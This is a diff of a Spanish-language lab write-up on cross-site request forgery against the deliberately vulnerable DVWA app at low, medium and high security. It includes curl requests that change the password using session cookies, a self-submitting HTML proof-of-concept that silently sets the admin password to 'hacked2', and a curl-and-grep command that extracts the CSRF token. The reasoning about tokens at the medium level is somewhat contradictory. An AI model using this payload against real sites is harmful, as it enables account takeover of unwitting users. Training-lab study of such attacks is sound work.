@@ -1,4 +1,4 @@
-# Cross-Site Request Forgery (CSRF) en DVWA
+# Cross-Site Request Forgery (CSRF) en DVWA LOW
 
 ## 🧩 1 ¿Qué es CSRF?
 
@@ -230,3 +230,222 @@ En nivel low, DVWA no verifica:
 - Si el método es seguro (acepta GET).
 
 Por eso, cualquier petición GET con los parámetros correctos y una cookie válida puede cambiar la contraseña.
+
+# Cross-Site Request Forgery (CSRF) en DVWA MEDIUM
+
+En nivel Low, DVWA aceptaba ***cualquier petición GET*** con los parámetros correctos y una cookie válida.
+
+1) Probamos con dos peticiones en esa ocasión: GET y POST
+
+```bash
+curl -i \
+  "http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=test123&password_conf=test123&Change=Change" \
+  --cookie "PHPSESSID=d78uv7uh9qku7l5nbk7ht9ve20; security=medium"
+```
+
+```bash
+curl -i -X POST "http://127.0.0.1:8080/vulnerabilities/csrf/" \
+  --data "password_new=test123&password_conf=test123&Change=Change" \
+  --cookie "PHPSESSID=d78uv7uh9qku7l5nbk7ht9ve20; security=medium"
+```
+
+Y, aunque, aparentemente nos muestra al principio de la consola la siguiente información:
+
+HTTP/1.1 200 OK
+Date: Mon, 18 Aug 2025 15:33:18 GMT
+Server: Apache/2.4.25 (Debian)
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 4322
+Content-Type: text/html;charset=utf-8
+
+Lo realmente interesante, está casi al final de la información ofrecida donde nos encontramos con:
+
+```html
+<pre>That request didn't look correct.</pre>
+```
+
+Esto significa que DVWA ***rechazó la petición porque no incluía el token*** CSRF necesario y ninguno de los dos métodos GET y POST nos permite realizar el ataque.
+
+## 🔐 ¿Qué es un token CSRF?
+
+Es un valor único que se genera por el servidor y se incluye en el formulario HTML. Sirve para verificar que la petición viene de una fuente legítima (el navegador del usuario). Sin ese token, DVWA no acepta el cambio de contraseña.
+
+## 🧪 ¿Cómo obtener el token CSRF?
+
+Necesitamos hacer una petición previa para ***extraer el token del formulario***. El token suele verse así en el HTML:
+
+```html
+<input type="hidden" name="user_token" value="abc123xyz">
+```
+
+## 🛠️ Paso a paso para hacer el ataque en Medium
+
+### 1. Hacemos petición GET para obtener el token
+
+```bash
+curl -s \
+  "http://127.0.0.1:8080/vulnerabilities/csrf/" \
+  --cookie "PHPSESSID=TU_SESION; security=medium"
+```
+
+O, para evitar que curl -s nos oculte errores probamos con:
+
+```bash
+curl -i "http://127.0.0.1:8080/vulnerabilities/csrf/" \
+  --cookie "PHPSESSID=...; security=medium"
+```
+
+Y revisamos si el HTML completo incluye el campo user_token.
+
+Buscamos en la respueta HTML algo como:
+
+```html
+<input type="hidden" name="user_token" value="abc123xyz">
+```
+
+Aunque la petición nos devuelve el HTML no encontramos el TOKEN dentro del mismo, es decir, el token probablemente se ***genera dinámicamente con JavaScript*** y por esa misma razón no aparece en la respueta de curl, ya que curl no lo vería porque no ejecuta scripts. Para comprobarlo, abrimos la página en el navegador y resivamos el código fuente (Ctrl + U) e inspeccionamos el formulario con las herramientas del desarrollador.
+
+Como observamos en la página web, **el token user_token no aparece en el HTML estático**
+
+En el formulario, vemos:
+
+```html
+<form action="#" method="GET">
+  New password:<br />
+  <input type="password" AUTOCOMPLETE="off" name="password_new"><br />
+  Confirm new password:<br />
+  <input type="password" AUTOCOMPLETE="off" name="password_conf"><br />
+  <br />
+  <input type="submit" value="Change" name="Change">
+</form>
+```
+
+Y, como observamos, no hay ningún campo user_token, lo que confirma que el ***token CSRF no se inserta en el HTML directamente***. Esto es algo típico del nivel Medium en DVWA, donde el token se inyecta dinámicamente con JavaScript.
+
+Entonces, ¿dónde lo buscamos? 🕵️‍♂️
+
+El siguiente paso lógico sería inspeccionar el DOM en tiempo real usando las herramientas del desarrollador:
+
+1. Abrir DVWA en el navegador e ir a la sección CSRF.
+2. Pulsamos F12 o clic derecho → “Inspeccionar”.
+3. Ir pestaña "Elements" o "Inspector".
+4. Buscamos el formulario y revisamos si aparece un campo como:
+
+```html
+<input type="hidden" name="user_token" value="abc123xyz">
+```
+
+Confirmamos que en nivel Medium no existe el token tampoco, ya que no encontramos en HTML la línea de código y, si utilizamos en F12 -> Console el siguiente comando:
+
+```Javascript
+document.querySelector('input[name="user_token"]').value
+```
+
+Nos lanza este mensaje de error:
+
+Uncaught TypeError: document.querySelector(...) is null
+    <anonymous> debugger eval code:1
+
+
+### 2. Usamos ese token en el ataque, que no pudo ser debido a que el paso anterior nos dejó claro que en Medium aún no tienen la opción del Token CSRF pero lo dejamos aquí para más información y conocimiento
+
+Ahora que tenemos el token, hacemos una petición GET incluyendo user_token=abc123xyz:
+
+```bash
+curl -i \
+  "http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=test123&password_conf=test123&Change=Change&user_token=abc123xyz" \
+  --cookie "PHPSESSID=TU_SESION; security=medium"
+```
+
+Sustituye abc123xyz por el token real que obtuviste.
+
+## 🧾 ¿Por qué esto es importante?
+
+Este mecanismo impide que un atacante externo pueda hacer una petición sin conocer el token. Pero si el atacante puede leer el HTML (por ejemplo, mediante XSS), puede extraer el token y lanzar el ataque.
+
+## 🧠 ¿Y el PoC HTML?
+
+1. Abrimos la terminal y creamos el archivo:
+
+```bash
+nano dvwa_csrf_medium_poc.html
+```
+
+2. Cuando se abra el editor de texto nano, creamos el HTML:
+
+```html
+<!DOCTYPE html>
+<html>
+  <body>
+    <form action="http://127.0.0.1:8080/vulnerabilities/csrf/" method="GET">
+      <input type="hidden" name="password_new" value="hacked2">
+      <input type="hidden" name="password_conf" value="hacked2">
+      <input type="hidden" name="Change" value="Change">
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+    <h1>😼 ¡Tu contraseña ha sido cambiada sin que lo sepas!</h1>
+  </body>
+</html>
+```
+
+Puedes abrir este archivo en el navegador mientras estás autenticado en DVWA como admin, y si todo va bien, la contraseña se cambiará automáticamente.
+
+3. Ejecutamos el PoC en el navegador sirviendolo desde un servidor local:
+
+Esto es útil cuando queremos simular que el ataque viene desde otro sitio web.
+
+3.1 Vamos al directorio donde guardamos el archivo.
+
+```bash
+cd /home/javier
+```
+
+3.2 Lanzamos el servidor web con Python:
+
+```bash
+python3 -m http.server 8000
+```
+
+3.3 Abrimos el navegador y visitamos:
+
+```codigo
+http://127.0.0.1:8000/dvwa_csrf_medium_poc.html
+```
+
+Como observamos en la siguiente imagen, al visitar la víctima la URL que hemos creado cambia la contraseña:
+
+<img width="663" height="283" alt="imagen" src="https://github.com/user-attachments/assets/2d8d3c73-ecc5-42e9-8bec-ee898c7d4a44" />
+
+✅ ¿Qué significa esto?
+
+- El navegador, al visitar tu PoC, envió una petición GET con los parámetros necesarios.
+- DVWA no tenía protección CSRF activa en este nivel.
+- La contraseña del usuario admin fue cambiada sin interacción directa.
+
+# 🔐 Cross-Site Request Forgery (CSRF) en DVWA HIGH
+
+En nivel High, DVWA ***introduce una protección básica contra CSRF: ahora requiere que la petición incluya un token CSRF*** válido. Este token se genera dinámicamente y se espera que venga en la petición. Sin leer el token desde la página de la víctima, la CSRF debería fallar.
+
+## 🧠 ¿Cómo lo atacamos?
+
+Necesitamos:
+
+- Obtener el token CSRF desde el formulario.
+
+- Usar el token CSRF dinámico en una petición POST para cambiar la contraseña.
+
+- Requiere que el atacante lo obtenga y lo incluya en el ataque.
+
+## Observamos el token en el formulario
+
+```bash
+curl -s "http://127.0.0.1:8080/vulnerabilities/csrf/" \
+  --cookie "PHPSESSID=TU_SESION; security=high" | \
+  grep -Eo 'name="user_token" value="[^"]+"'
+```
+
